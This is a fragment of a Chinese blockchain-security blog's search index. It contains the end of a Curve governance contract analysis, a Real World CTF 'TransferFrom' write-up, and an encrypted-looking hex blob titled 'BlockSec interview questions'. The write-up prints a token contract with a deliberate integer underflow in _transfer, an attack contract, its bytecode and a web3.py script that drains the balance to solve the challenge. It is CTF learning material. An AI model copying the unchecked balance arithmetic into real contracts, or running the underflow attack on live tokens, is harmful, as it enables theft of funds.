_value.mul(PCT_BASE) / _total;\n        return computedPct > _pct;\n    &#125;\n\n    /**\n        * @dev Decodes data by performing bitwise operations.\n        * @param _value Value containing the data\n        * @param _shiftValue Number of bits to shift to the right\n        * @param _maskValue Number of bits to apply as a mask to the value\n     */\n    function _decodeData(uint256 _value, uint256 _shiftValue, uint256 _maskValue) internal pure returns(uint256) &#123;\n        return uint256((_value >> _shiftValue) &amp; _maskValue);\n    &#125;\n&#125;\n\n\n\nAnalyze为Governance合约，可以创建新的proposal并进行投票，投票权中以veCRV.balanceAt[voter][snapshot block(start block)]计算，创建新的提案时，创建者可以选择是否将自己的的全部票数对所创建的提案进行投票，投票时候会判断是否满足执行条件，如果满足则执行\n执行过程是，调用合约的runScript函数，将创建时的运行脚本进行运行，首先delegatecall合约callScript，合约callScript再call向target合约执行对应的oprate\n","slug":"Curve","date":"2022-08-03T06:32:47.718Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"0d3f2f790504b07f55c87ed185dd8ea8","title":"real world ctf->TransferFrom","content":"real world ctf TransferFrom复现\n\n\nreal world ctf\n\n\n\n\n\n\n\n\n题目要求：nc 47.102.47.140 20000，We design a pretty easy contract challenge. Enjoy it!\nYour goal is to make isSolved() function returns true!\n0x00 Codepragma solidity ^0.6.6;\n\nabstract contract Context &#123;\n    function _msgSender() internal view virtual returns (address payable) &#123;\n        return msg.sender;\n    &#125;\n\n    function _msgData() internal view virtual returns (bytes memory) &#123;\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    &#125;\n&#125;\n\ninterface IERC20 &#123;\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to &#123;approve&#125;. `value` is the new allowance.\n     */\n    event Approval(address indexed owner,address indexed spender,uint256 value);\n&#125;\n\nlibrary SafeMath &#123;\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    &#125;\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    &#125;\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b &lt;= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    &#125;\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    &#125;\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return div(a, b, \"SafeMath: division by zero\");\n    &#125;\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n        return c;\n    &#125;\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    &#125;\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b != 0, errorMessage);\n        return a % b;\n    &#125;\n&#125;\ncontract ERC20 is Context, IERC20 &#123;\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    uint256 private _totalSupply;\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n    constructor(string memory name, string memory symbol) public &#123;\n        _name = name;\n        _symbol = symbol;\n        _decimals = 18;\n    &#125;\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view returns (string memory) &#123;\n        return _name;\n    &#125;\n    function symbol() public view returns (string memory) &#123;\n        return _symbol;\n    &#125;\n    function decimals() public view returns (uint8) &#123;\n        return _decimals;\n    &#125;\n    /**\n     * @dev See &#123;IERC20-totalSupply&#125;.\n     */\n    function totalSupply() public view override returns (uint256) &#123;\n        return _totalSupply;\n    &#125;\n    /**\n     * @dev See &#123;IERC20-balanceOf&#125;.\n     */\n    function balanceOf(address account) public view override returns (uint256) &#123;\n        return _balances[account];\n    &#125;\n    function transfer(address recipient, uint256 amount)public virtual override returns (bool)&#123;\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    &#125;//存在整数溢出漏洞，只需向非0地址转账非0token即可满足require要求\n    function allowance(address owner, address spender)public view virtual override returns (uint256) &#123;\n        return _allowances[owner][spender];\n    &#125;\n    function approve(address spender, uint256 amount)public virtual override returns (bool) &#123;\n        _approve(_msgSender(), spender, amount);\n        return true;\n    &#125;\n    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) &#123;\n        _transfer(sender, recipient, amount);\n        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,\"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    &#125;\n    function increaseAllowance(address spender, uint256 addedValue)public virtual returns (bool)&#123;\n        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    &#125;\n    function decreaseAllowance(address spender, uint256 subtractedValue)public virtual returns (bool)&#123;\n        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].sub(subtractedValue,\"ERC20: decreased allowance below zero\"));\n        return true;\n    &#125;\n    function _transfer(address sender,address recipient,uint256 amount) internal virtual &#123;\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        _balances[sender] = _balances[sender] - amount;\n        _balances[recipient] = _balances[recipient] + amount;\n        emit Transfer(sender, recipient, amount);\n    &#125;\n    function _mint(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: mint to the zero address\");\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    &#125;\n    function _burn(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: burn from the zero address\");\n        _balances[account] = _balances[account].sub(amount,\"ERC20: burn amount exceeds balance\");\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    &#125;\n    function _approve(address owner,address spender,uint256 amount) internal virtual &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    &#125;\n    function _setupDecimals(uint8 decimals_) internal &#123;\n        _decimals = decimals_;\n    &#125;\n&#125;\ncontract Ownable is Context &#123;\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);\n    constructor() internal &#123;\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    &#125;\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n    modifier onlyOwner() &#123;\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n    function renounceOwnership() public virtual onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n    function transferOwnership(address newOwner) public virtual onlyOwner &#123;\n        require(newOwner != address(0),\"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\ncontract FishmenToken is ERC20(\"FishmenToken\", \"FMT\"), Ownable &#123;\n    function mint(address _to, uint256 _amount) public onlyOwner &#123;\n        _mint(_to, _amount);\n    &#125;\n    function burn(address _from, uint256 _amount) public &#123;\n        _burn(_from, _amount);\n    &#125;\n&#125;\npragma solidity ^0.6.6;\n\nimport \"./erc20_fake.sol\";\n\ncontract deployer &#123;\n    FishmenToken public fishmenToken;\n    bool public isSvd;\n\n    constructor() public &#123;\n        fishmenToken = new FishmenToken();\n    &#125;\n\n    function solve() public returns (bool) &#123;\n        require(fishmenToken.balanceOf(msg.sender) > 100,\"token balance &lt; 100\");\n        isSvd = true;\n    &#125;\n\n    function isSolved() public view returns (bool) &#123;\n        return isSvd;\n    &#125;\n&#125;\n\n\n\n0x01 Analyze题目合约有大几百行，看起来非常的吓人，但是仔细审计代码之后发现题目的漏洞还是很简单的，主要就是一步整数下溢处漏洞，另外这道题第一次做时最大的难点就是web3.py脚本的编写，为此专门学习了以下web3py\n0x02 Attackpragma solidity ^0.6.6;\nimport \"./erc20_fake.sol\";\nimport \"./rwctf.sol\";\ncontract attack&#123;\n    FishmenToken target=FishmenToken(0x3C563092e25D7b597d97FCCf3CC25f5387104a7B);\n    deployer target1=deployer(0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9);\n    constructor()public&#123;&#125;\n    function pwn(address recipient,uint256 amount) public &#123;\n    target.transfer(recipient,amount);\n    &#125;\n    function pwn3() public&#123;\n        target1.solve();\n    &#125;\n&#125;\n\n该题为私链题目，应使用web3脚本进行攻击\nacct=w3.eth.account.from_key('your private key') code='6080604052733c563092e25d7b597d97fccf3cc25f5387104a7b6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073f2b1114c644cbb3ff63bf1dd284c8cd716e95be9600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100b957600080fd5b50610242806100c96000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80639b30d8241461003b578063d97cd47d14610045575b600080fd5b610043610093565b005b6100916004803603604081101561005b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061013b565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663890d69086040518163ffffffff1660e01b8152600401602060405180830381600087803b1580156100fd57600080fd5b505af1158015610111573d6000803e3d6000fd5b505050506040513d602081101561012757600080fd5b810190808051906020019092919050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb83836040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156101cc57600080fd5b505af11580156101e0573d6000803e3d6000fd5b505050506040513d60208110156101f657600080fd5b810190808051906020019092919050505050505056fea26469706673582212201bdb0b7246202efdfcac322c01db2cca7d786875f54ea6fb5a2b9eb322b34ffd64736f6c634300060c0033'\n contract=w3.eth.contract(abi=abi,bytecode=code)\n constructor_txn=contract.constructor().buildTransaction(&#123;\n     'nonce':w3.eth.getTransactionCount(acct.address),\n     'gas':3000000,\n     'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned=acct.signTransaction(constructor_txn)\ntx_id=w3.eth.sendRawTransaction(signed.rawTransaction)\nprint(tx_id.hex())\nswapaddress=w3.eth.getTransactionReceipt(tx_id).contractAddress\n\nswap=w3.eth.contract(abi=abi,address=swapaddress)\nprint(swap.all_functions())\n\npwn_txn=swap.functions.totry().buildTransaction(&#123;\n    'nonce':w3.eth.getTransactionCount(acct.address),\n    'gas':3000000,\n    'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned1=acct.signTransaction(pwn_txn)\npwn_id=w3.eth.sendRawTransaction(signed1.rawTransaction)\n\npwn3_txn=swap.functions.totry().buildTransaction(&#123;\n    'nonce':w3.eth.getTransactionCount(acct.address),\n    'gas':3000000,\n    'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned2=acct.signTransaction(pwn3_txn)\npwn3_id=w3.eth.sendRawTransaction(signed2.rawTransaction)\n\n","slug":"real world ctf","date":"2022-08-03T06:30:11.232Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"c4192ee28bd2d2701353c24c31e1eb4a","title":"BlockSec interview questions","content":"\n  5ffeec95dbca2cf314a5079e9b1a9cee7c5dde9129393b2df62ad57f593802e58ae013d88c2afcdf1049287eb070b781be2e7a1730682cc3b28f747257af99385489bb24e3ae9dac576fda341f4ce5a0b14446f4aee86e91f21db8b7b309d14ca36312b55fb41175035cce6431a1c993ad284432d4a5d25f059578d4f77aa94f819d4d26e35f555327d87f09df60286bd9f6bc778706b12d05b52476758231431e0cdfac0f99fba3189710f72eccf78aa9c747bbc4e1b668f017b524c4d006b03be59e93d1a81329a089ad08adfe0d98100eec8f6484b1d6926e98700877c70b89dc5ae954a91f550dd515708725fa9e8333f9860d8f230df2cb4b7da17c8bb806cb54e80e668f1bc72d7c298f3df8e67a862ec54e5da37d5eb29babca5938fe43552b91acbf01ebfb380619aba940a9da7ef44cb1b745c1f0abdaf142547274e8f8b0836f1407321027a57cba31ed66ff139835ecfbeca2a9a5796544e0984acc53daecaea6aab19fda2dc6f52550d312ab5610e47a08418d80a8275ce940285e0b3265feab95819858fa63af3eefa4352174bbf4bf7c4929065e2fb7b3da6a92c6072a828c4173c6f96a8795c0bb23869f4014a34db9a90ed767326cd04a451df6fa1c516627ada2ab4f6e6ed8d9a71b3e41364f8281349d2d6dcabc7383682de84db1341f353aacb668c78cb19781b298e6e8a7fda8e6a2388e21d8c3ae3483c37e90babef9b27e01dbe0be97ce640a809248fa0af21b0576338f210dc0d77e82ce26d117c4113be8ed3900fc2a78e9afddfc8275cc74226a459e1d54690a35ce49d2bb8356ebebc7eeb7cbf8dbd02572ce6312f37e327255fe351fbaf6cb5d683025d7053d683a5ca164d5febe80f795c4190dc74c48e196c84705743ee8f546fc6edbbe69432fb5f72eef8fb59b93a2ffc048d7d4ac1c3cec978f1fb95a1eefea2056102622cbe3867b5ccbde21fb1112db31568df3bc0c453128efca5fd66449cbfe67cbe237d502a14c35ad66e119a29f2180fe4c6080a2e16d934c0c5da01b6599e8dfdfc9ba5eeed75c58b679aba15e3cac78e4df01e6d303db9bee9a9b098a08c073efd853708406bfe2672eb149317c02827ae3313515a608150f6186197e52550ba41e2cd4cea4b4261dc98ec645439ae260338364db5d4670670b5556071fb9e8e42a0b9a68583e00ea752717a82185fd107c4245ec1b731053243d54f73a60e28b58f0cc312529d3e7256d5077a4799fdb2bed4e507904b75b0216cded3d13591046403598d45c8a2911040ece13d9e6152a35a64819a1e7ce49f07628449d8b3f4d612a71553fd7a4720804f393a58f0d2fe7d00ea919473af00dff49e3ddc1697d74c1885acd4d02142893d0d44342f34e91c0a081711e238525df38e1a9445a5c63039134f668e8a5febd92a71bd1c0c0772cbc755aaba9d99ef6f55ffaeefdedba51ff0b81a6e2ef7b015615ade66ae8d6f2a3fa4dc17f6f425c0c43abbd788b6528ac9962b7e9a2ec7424c3a87241ee0f196ee71ebdbb3be04c2d022e5d73829418efb36194bb827c70a2220d621913f0c141c7e4d2da4d6bfbc34e7d5928c617b87ec7e001414a13b9dc2c257d3f937583928f853074da6bde4c4a0bba6a9e61721d2cafd392aa19c55022cb8fedda1fe687fa8290213d3637083d8fac3885ca2a7f97d0bb2b46e798d138cfa7c55248f68fbc4e08c690dd90cefdf92908f8cf72835b60f9e674eb80d2259a75a16e90ebd82cbbcdf62d5afbae43d6e62cf65c8db38a7aa9a44f948957544f57a2581d82d0994cee3c25b4c172dc17d7855926f02ee83a3e4001d1abae5dca975407306abbc761d591e724d877b63dae6c407e6c4be0d0fe377fb4356d4ed44e60340da17cdc2c04e8d558e1d44e4f34fc330570b30dcc455d35d7cd670eb9a787cd9b9effc32e4e8918094b707b2824c35141bde0e79fd855807184dac3bc5d3d305e4cce34841c7c7c655ddb8476e47b8370028db2267a90a42b67f02695f559984d539b08650fbd33121b8fdcb52517fe92fc5dec308369bf89f5cab7579e5149b5354b61769018077d7f9aa4be48713480e1fd5571ff26782579ace535ab7e75cf1ae5752dc85050547d8b16983e2a0490a9d0314ebe81e57ee61d5069cde59f1f562d315c813b761b8fa250b0ab0f9396af4837bd16bb130567af3be9c2c96d8c83bdcae91d7adf9b9a0e2bba5f8e760bcbb07319a327cfaa45d3ad01bcaf12345df9aa78b3debb76b9d2c886266b58f676ca565f32b4cc8b3a34dacceffdea1071960d8a4a677bfadbbd313e46bc407560f5223bb0d50cabcd84340447371c2970fa25094babe84050082b59fed23b962faefd6e60bb5eb46998ad653862094f467857d241b37c2c951142f951cc6e8ac9bf20763206ffca45db8d3fdc10fe7593a8c41721b2ef0255c13cd1d81aa88860df2a30904fd699353aafdb6e11eeeb38b8c67029e628ae8125207bc3bf0f4132a5f13188449572ccff4ee299c5f34f47e2c1fa13f724cadc728628dda0e92f8643cefc6668520b78993531097843c062200e25938546f0eeefb8d5e2c735c24a5e4533979099b4939ead296cd2f1494b18b724efb6b4d7adf7bd5d432ad8d3b727a8a519de4905561ead4aabf85039778e963a0bb059aacce9bbd54f3ae41e180e97d4b7b69c73624ba268fc9041140fe41a284eedfda5571e99dc7e2a9368ab8935f58289bbb91d50907fafd8bc7202291e44fc7e516655f202e35ba7b26b6404a5f4c89ec0fe2a6b551efe35db3137f6bb02b1a9a32e05414534e955d7d9e49021f8bce18f7ece14ceedee1902fa894ae597a6b25b188a30945428c71452f9cf17dc3190926e213eb91dea619d99405ef23f02f2b6ca925b5a6b1fbd07adacbe1de99e77418539523918d17f5fb6c82b23ebdfe8e0568f53a5ef4fd35d19f9334d3f99d7b234ab279189bc9b189d8a0842adf1e112aa5b156d8d3cf90b9188f6922d0caaaa05f4ac38c8e9cc1d37a9c55cb534af2748ce54af00cd79cb638cdf296941e63f65d55c3e90e212a15ac8f9dadfc8921456d2837702b82f1e2ba74c24e491fa2d63d44641edc9bce070704507ea5eab6ad1496daed5da7dafbbcac6fe6d2cc5d8b076d28e863cef0c09b60179679ef69210e189cca57ec28411c7d4cb7577c7bcf29f3addb6f3b46e14ca838e347fa2d7cdb27a06c30b2db296d3a5ee07d7f97f83eca531f402d130b6a35c5f4b73cb1ea7f82987d4f8e5a3676d297e07f47ab150971e61693917c2b520b736101171b31222c0587f2c231e87998a9e8c1b2a56bd7d67f81f4bd5038c61b2be48a511e1f2c6b51ecbe20b564a8f419ae88b893fe493680c85da945a896bc9986e9d46997514bf0c01cfeede58825d770cfd397b51b5754a6dffc56ed81575e7b4555ec3b65d6cbad0ba96907a9f22c3167ca742310f1ad9393da9e406fbb5990c3b1f8c9acabeaa9a3a6c13b6d13989549d917df22a2cf6a8d899e466da7183a052bb67e57e0b522362122b0ad3177e179a4625e1b66bfd19d55b3d9b3b001c7d6fcec7c03b3fc58cab1609e80a2f1a6de49ada571bdb7c6eb1ecbf5fce4bf78493710c0500e622a67f17226ef8669f8ea78688e48d7b1b8ccb3013202c6fb9d0029ac3df0a0668b1772d10271ce4f275f5d257e7f67657c9b23beb8e4f4816353252c65926e533f9f6f49273ab7ba53835f7b97912c140c63a6b8a3e1d238f00729a64dd986fd68eacc4dbec928bfbb90968597f76ba44f0906a5c7e4e84629120d83abfe7e737967cc21d99ad870a4683d30b3afc10922311596c3dfb1acf94ed0dd764fc84b1d54178db807aa92e3d3fa5083c2c394175b9fd5ebb0fb03bb0a9de0760ec002260e6f1ef955e82c78b18aef78b1ba97a8ff24c99ef89f4ece70255325a6a671d370102a0bf4f115ee542ce9a2b8cd8f0429bca868778e7a46ef2b359d3e16a57213e1f06a6f04465b5c73c4480c7cc34dac016841886c805c3a64feaf23d0a53f9768cc71105540a88abd251a0bece57319d15781b1b108108464cc4b0ff8dcd8ef2466254604e572d54d423630941a63c9e4ef72b9f1e5c939225ae3516d17f69c9dc40ac82fe8de8b7bc7fb88a4ea61c8b57323b11c31b3681887337df39e2448dae56f05d15b50dadaafcff5781121f481cd0c24e012eae3ccd0c03f126c8cc1e33bd403b050162896f20a15dc9e4d83b1df2aa48e1f1068576b3d1ad7e846e2abb35fd70ce04e8bbe4463defd5a04d4aaecec3b1cba9a2dbcc3e3ae71585814026454932bd4a81bc6f183c3cda9ccfbd82fec76cb705e50904081eb31442cff53e5943fc31ce94b644e812eea5916bcb34cad03f4b45ef7947e139c0f8b2dc57d890b16ca4600272abf976bbab1467c1c98e9216d7a2cece56474e186934af76cebb12b96b70bf14e77e89dde858289ef061ba832ab6e9c122323558b24fb2f644269443822ab98d0456fb53277a42ed4fd53766e2f9f72324c8c2615b80e60e32d5ee8b228e23eaa941f99234014058916d0d46a810e1f7fba7de9c3bfd421ac52047b88508dda2242425d48e239397e522745dd113bf062439a6fdb02f0acdb2a05c98a6a3c04b49753809a3407722e53d30d536f3239422351cd70c8439b2e1a0bf93dcd7adf4f8fa5728697fe504e944b157587657f825cabcf2f99a80c9892d79e8369ac9dcb3905733210dc42a770f34994186b65ce110a62f973c0f5f466427b61f1483967f962ffaa06fe2e72329842868915cd81bc748e5d4ca55be1cd145cb1ea4c5d15798bc01264e91513ea56a51603ae678dbc932734809fc3633754d44a7e97ac3496bd293d8b99f573d3b03893d56a5daa4b98258d2b127be4350a4011bd71a018b03136f5d2b048b6812f2d27fadc328897b546d1c05cbdc5d2daaaa34a8f3725dd74dccc1ecd16610c03c0bf765fa3be66f94ba22d8c4b1e10378a53a58041d237782330496399f08e230d6e8ccd4fa7c176a63c42e27a4da4d627725aa0837c2f4eb5e35ce438db7a569747c2a7805eb7e6b1e280033b94aa1ebc19c1678184dc736e81c944a234da3cbbc6a37127b52f704353e2d56366af96e253a6a5a6993d1187dcb3c6ee593a88f753bd7e989bc15711d4943e1240a9d3d1560f7ec750af19e15806ad35ad8b45cf413dadf59a8f9824723629941927b206dac14a81424f810e188a0c8f1bb0c0d54d7f79bf97d9fd0169ad0b3f4a0f6676c3b7f642bb325c68e306d2dfc0e637af7ef83c6429a92a8c022b883988b9d5d854ff006e6d0c774625bab3163dd36521e7327cb3368cdf65d3c6d9fed1fbdd24d00b426f0c1a140bca5057e18f8eba1d0e2efacb637830f620456d0e3992d05c5a435c09ab92e8e604ec1db3e5df72a96c5334162c67ca83f9f9e76ff85c3e71910ed34385176c7de194c3138ff2651d2125d397a3247926cbe3aaf8322910e1958edefdb189eaed28e78f7b154e2e72b3f42f733f35fd0bf6e746edc7f9f786d93fe1dbb32bf47f08e2f77d0f8992de3e2a9d982cddab11f6b2970f7e698dae74dc4afd101b81ceead2d3304f0e8136debe628c9ea1a6433368d359723429fadd328bfe986b5185e481e314d0c51e8a2572e38b8830eb9271e4da9bae85673c76c8c025ae2433b968426c27658c14e240c1b26ff514de1e8a96ff779c87f4d88ea35730e7e7ab9e14924676cfe4ec57e08d4bda6176a32f30be5e1c2864262e18294016740c18a7360c90375a7c733d78be104929597f9cf5718b05ab6d522b17d8dcb97f2a48790a304285238427d8b6ccb02ac4d6e7c45de7fc303a50a63f8a8d4fe9ab56704f5355cf235f25baf2a4b0953596266b9c5d1761b186b197f617d9161b620d4be4315622b37ff2563382206efdd4954b48cf228b88fe5c04a9ecc7b348ea682b0f6c3f3d716f8e0ab1dc06207d7f7ff2dac6f49a1e17bb2776a1dd11cffecb47beec38bddf71c9544a63c68c4782ee7f655a4cebe0dfb9c37857db3e1726b9947334261a780196da6e6c3bcd378afb446875bd05f57273e9c17d6ad6f81fedd97fe7a9eba09ae4f610e7b52bc91fc5423fe28f1b5314243be0d928c9b4a30aa31128af3ed10481610e7480cb1d36cf3b74d6d8b35dd53cb7feace5a5e74a8f504ed90b4dc4dc503a2532c8367194fb8993c2618a603e70a004766977a5b3a37adeeef33dc56a97394939941f27afd5c2277d8a2aa3fee42040c4b2b8e661543d446c619739c693c572c844e348a7c7cec9941f6dcc591e9112e365f44b14e8754f03f4a4f052346173512ea69927abea8a681aba3200579acafb3958a409ec62e765f50fa8ba2593ee7bb10115e8ff77ecc778581a6d917fa713e2372c6a5322638c9d8eb6ff4d2395aa81964168965435cdcaaa1df7d06c210ada57795d5695419bffc5bab9223669f49ccf91d7a4ab92a26621ab89353dc35589bca6a4471c5c38984fcf6d6b69d47ce7c7fea7f336439513acf2b2c911f9ef0004cf1b6986956b7d8d868d0dc111a8d9a944bbdc3686d35e8d98efc1a0200df79d2004f4f265fe6a3cd33d4d3897f58a3bde8298f135537c7465c3ac587303321f60a3fb04c237db00cb54820c955aa64bd6ede1775234c72d17860d123b74770e472a7ae30b3f689271a937a3daeaee96a8d395d741b10af3bfad8941e02ad3755f146d0d90ad1cb6255cb6affa05b6018bc2eef616a2d8364dd133f5929ff00b9f8bcda5bbcf736b353cf26f1f472f11473bf9c93cf3f3afe67dc05ed5ba723c2efbddbf77a91aba9b64d02d82c1c1d758c7eb35a8c266da5315fcb26a35507eee7742dfbf2266cdbcb16011d975202085462eea32a7d722d96e5204d443819885dedd6f22a3e344af0d30c545003f9f1cbe443567a114e63b63527abcee8710d06ded5653f0bfad602353d3011dd861fc087c6a7efea74e375ecc4950bc18253dadfe9b4a9a6d5fd8f338535a2fcdbbac93cbe0b7397ed94e7a7b753dc242ba7fedfa653d45632a001627749e51db7497f84a23e4b34180adcb7cfeb9793f3ccbbd1d9f9676edc917ab621e4b472574b0fc204bcffeb802df99724901aca72a5e6698e3ef254e4d1683a8c19200ce7d448bb1c24e0d6624221a1318552db84240b614a6f5549c89cbb4762cc80f82a170457893fd4c0e06be13d6af9d1fec2edbe86510306cb17033ec66f18079b78880e342715fb9647c412f36b21cf1d0c45168ffba258fa96e63640db2aa9f88231da021a40e01e3c85485f26124e4abdbed6d51a710d2cd7cbf99cd0bcd5b4a5aed7b05947b0171400494a46b900cb139475fd6bb2d2272844fd0dd083d31247f563f945ea289c52f8997b8df7b07095fce7bb476f9a258791974d53945e9e055c2c7eb104c74a22eface794eaf28561f60b904b32771caed01fc4078c892c20078f2d5ae154db0b362f53f07bc6d3be6a837209e964943e692db375d5ba3bbf4ffd1031f46d868c40b8850e8e8f1b5e59193a33e167e12c391a0e6adfe6e69dd4bbb68dc44d2294fe633c6f0066f16f4d4a8f2dd569739eafa07f7999513982d741f6d27182fa96fb1fce3b96cf08077aff87f8e9474c5fb7fb0395e55e408e81b3c324200049aac5eab0d0e624c906fe113a37f9330b76c75345f3ea04948f3771ef245db3216dd7cea6f472c55ea5b548255f6a387a032bab8c00d32f051f5ae3bb6f8e376c05888691079ecd37cf40112d2321449e3fdc6c57a26827201d31622eaf22a509d7dd1d464c110b127d36c6fb8e713fd68036a39fc9455432850b8d16bee694339911ed3d7fb1dbce5dc8605c8ba7aefb52d4515cec961809c4fa0f5b0f5bf3a9f7a59d72cb6318e9435cbd01e708327a8bb2d94df93fa1476f37a703eb1815ac6fe97cb457f0257f5baf0f94491294a3f82ff28d99b913bf815eb56da00a333b92a0b77b636865f796810e7bd961f25669b1210e63adcde80d909d8701c5df0e7a2b6d81420c0c3491599938577382901c5b77c34a82a5680af9bdf3d6ad83bf697d9c3cc5fabe552af015b52e0573349a7e683395559f8bcc9e3791615e92575981bcc0324c6258c98da5c8361c648cf1349a1ddf06f9ac450b1424873e48fe91baf483f0e8f6abcf2e1cc78f607de6d576d93897fe933f4d5f048b93575887acdcd53d6bda341215c7f1a2ab4511f41a4b899abccaa27863a30f6047c905f67bdc4bc8ae06f5422a090734a43f9b7e9b21cdcc020a578eb642f113322b34847dfed046f553eadaf80834d477c205f801153da074b88548985e671dd9e0d4af66c6c066888ff5d3982678a354d31a611102abb0579bd5d94f5d82e6879f84ddd22ab3f5cf379b0b1788ad443bd79e1122097199838c92b4a6097e054984753746fdba5850c5cf103ebb2836d1590b022a773b3288205d4b6fd095335a6f60c02215e90ed115bf5af1077e1f42c25d91fa3d23aae763eabbfdd6da322ec2e37ba8fb5b16b2ba64e19bc5579b760a1faeb65312cd5787b45bd298a61858109e41933eaf917a998a848b847817abd26974cdccfd843a5119ee538783557c3a0c2d6eb229f1e1e397de5ff793d7cf8e6e147844d8e02d420cf49ba73a3bdc561e082bfed4d307bc2da7906d3d4c469f32248c44888379b5f998addde979b5073eedf99d49714474f86e9308588695f499ad3bab6927b8454b2d8145095aee36919b8b8fd1521b25809c7e7999f5b45e2f196c1fcbdeb2d490f09e1ec62be657d8c9380e30564394c65cc0a30629ed7d3d126685a0dc6c7f87eb70c6b76d753c92e5d3375989b8324b1c4904288052a22828605ae0eed17271c3619aa1dd7c57bab6b70136005d1790d8c5d43b9ac70662980dbf9c2d55f47198e75b4ba6ab80c1da7a9559376d0d2d4bc3918791ba30e23ea2901432a1da8094e524b99002e2e3c237605f02896284bc9c7103598d4d2fb6c1b1c52efd9a03e2c74c7c4cb2eca05722ca3be77e5c27590f3cb8e4f3a4110ab4c7f2beb1e501df0567be5aa01c4bd3edc91824406a9dcba99314867f95c17212b67dfeeec471f802b3586bab342dddb16c10567a6032ad93484abfcfb982e1bdfb8577e57ff1ca6b61da6af11b7e68a5c989d282848f52cd714e810d16c260b2094abde4898aefbd548a5ee08f1de6c9775d85db2b68362681f74f904882f6a3e8e2adb8bb184c09187c6ff9f2f8f1a6021b468cb67f3c515352572e7a1d26df42eeb469c716e71c24bcbf0d338d4b95b841cf629a4b2d30203458cbd0d8f6bcb4b508e05fdef5455bb23d88a4ee3b4c7085946e75b287d679acb34090786e7041ff40b97c8006b3c6d6875c1f09ab9257c44af5b9b83b251ee8eb1de98536e2e9ad9a56ef53a9c2d84bbc445d3d52660e96a117306218ae703d486ae1b3f